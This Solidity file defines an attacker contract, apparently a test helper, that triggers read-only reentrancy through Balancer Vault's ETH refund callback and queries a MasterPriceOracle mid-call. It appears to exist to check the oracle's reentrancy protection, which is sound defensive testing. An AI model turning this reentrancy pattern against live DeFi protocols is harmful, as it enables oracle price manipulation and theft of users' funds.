// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { IBalancerStablePool } from "../../external/balancer/IBalancerStablePool.sol";
import "../../external/balancer/IBalancerVault.sol";
import { MasterPriceOracle } from "../../oracles/MasterPriceOracle.sol";

contract BalancerReentrancyAttacker {
  IBalancerVault private immutable _vault;
  MasterPriceOracle private _mpo;
  address private _lpToken;

  constructor(
    IBalancerVault vault,
    MasterPriceOracle mpo,
    address lpToken
  ) {
    _vault = vault;
    _mpo = mpo;
    _lpToken = lpToken;
  }

  function startAttack() external payable {
    UserBalanceOp[] memory ops = new UserBalanceOp[](1);
    ops[0].kind = UserBalanceOpKind.DEPOSIT_INTERNAL;
    // Asking to deposit 1 ETH
    ops[0].amount = 1e18;
    ops[0].sender = address(this);
    ops[0].recipient = payable(address(this));

    // but pass 2 eth, so there's an amount of exceding ETH and receive() callback is called
    _vault.manageUserBalance{ value: 2e18 }(ops);
  }

  receive() external payable {
    _reenterAttack();
  }

  function _reenterAttack() internal view {
    _mpo.price(_lpToken);
  }
}
